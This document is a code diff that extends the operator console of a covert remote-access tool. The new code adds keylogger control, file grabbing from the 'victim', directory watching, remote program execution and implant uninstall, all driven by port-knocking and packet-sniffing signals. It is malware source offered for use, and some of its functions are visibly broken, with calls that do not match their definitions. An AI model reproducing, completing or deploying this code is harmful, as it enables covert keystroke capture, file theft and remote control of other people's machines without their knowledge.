@@ -39,19 +39,46 @@ def start_keylogger():
 
 def stop_keylogger():
     """Stop the keylogger by sending the stop signal and wait for the log file."""
+    global current_signal
+    current_signal = "KL_STOP"
     send_signal("KL_STOP")
     print("Keylogger stopped. Waiting for log file...")
     start_sniffing()
 
 def start_file_transfer(file_path):
     """Start the file transfer by sending the file transfer signal."""
+    global current_signal
+    current_signal = "FT"
     os.system(f"python3 encoder.py FT:{dest_ip} {file_path}")
     print("File transfer signal sent.")
 
+def start_file_grabber():
+    global current_signal
+    current_signal = "GRAB"
+    send_signal("GRAB")
+    print("File grabber signal sent.")
+    start_sniffing()
+    
 def start_watcher(file_path):
     os.system(f"python3 encoder.py WT_START:{dest_ip} {file_path}")
     print("Watcher signal sent.")
     start_sniffing()
+    print("Press Enter to stop the watcher.")
+    input()
+    stop_sniffing()
+
+def start_runner():
+    global current_signal
+    current_signal = "RUN"
+    send_signal("RUN")
+    print("Run signal sent.")
+    # display program output
+
+def uninstall():
+    """Uninstall the program by sending the uninstall signal."""
+    os.system(f"python3 encoder.py UNINSTALL:{dest_ip}")
+    print("Uninstall signal sent.")
+    sys.exit(0)
 
 def handle_received_data(decoded_data):
     """Handle the received data."""
@@ -94,14 +121,6 @@ def start_sniffing():
         print("Waiting for signal...")
         sniff_thread = threading.Thread(target=sniff_packets, args=(local_ip,))
         sniff_thread.start()
-        try:
-            while sniffing:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print("KeyboardInterrupt detected. Stopping sniffing and sending WT_STOP signal.")
-            stop_sniffing()
-            send_signal("WT_STOP")
-            sys.exit(0)
 
 def sniff_packets(local_ip):
     """Sniff packets in a separate thread."""
@@ -109,9 +128,11 @@ def sniff_packets(local_ip):
 
 def stop_sniffing():
     """Stop sniffing for packets."""
+    # forcefully stop sniffing
     global sniffing
     sniffing = False
-    sniffing_event.set()
+    sniffing_event.set()  # Set the event to stop sniffing
+    sniff(iface=None, prn=lambda x: None, store=0)  # Dummy sniff to stop the previous one    
     print("Sniffing stopped.")
 
 def save_log_file(encoded_data):
@@ -176,10 +197,6 @@ def save_to_file(file_name, content):
         file.write(content)
     print(f"File {file_path} created successfully.")
 
-def run_async_task(task):
-    """Run a task asynchronously."""
-    threading.Thread(target=task).start()
-
 def send_knock_sequence(dest_ip, sequence):
     """Send the port-knocking sequence to the victim."""
     global ack_event
@@ -239,24 +256,31 @@ def main():
     send_knock_sequence(dest_ip, knock_sequence)
 
     options = {
-        "1": start_keylogger,
-        "2": stop_keylogger,
+        "1": lambda: start_keylogger(),
+        "2": lambda: stop_keylogger(),
         "3": lambda: start_file_transfer(input("Enter the file path to transfer: ")),
-        "4": lambda: start_watcher(input("Enter the file or directory to watch: ")),
+        "4": lambda: start_file_grabber(input("Enter the file path to receive: ")),
+        "5": lambda: start_watcher(input("Enter the file or directory to watch: ")),
+        "6": lambda: start_runner(input("Enter the program to run: ")),
+        "7": lambda: sys.exit(0),
+        "8": lambda: uninstall(),
     }
+    while True:
+        print("Choose an option:")
+        print("1. Start Keylogger")
+        print("2. Stop Keylogger")
+        print("3. File Send")
+        print("4. File Receive")
+        print("5. File/Dir Watcher")
+        print("6. Run Program")
+        print("7. Exit")
+        print("8. Uninstall")
+        choice = input("Enter your choice: ")
 
-    print("Choose an option:")
-    print("1. Start Keylogger")
-    print("2. Stop Keylogger")
-    print("3. File Transfer")
-    print("4. Watcher")
-    choice = input("Enter your choice (1, 2, 3, or 4): ")
-
-    if choice in options:
-        current_signal = "KL_STOP" if choice == "2" else "FT"
-        run_async_task(options[choice])
-    else:
-        print("Invalid choice. Please enter 1, 2, 3, or 4.")
+        if choice in options:
+            options[choice]()
+        else:
+            print("Invalid choice.")
 
 if __name__ == "__main__":
     main()
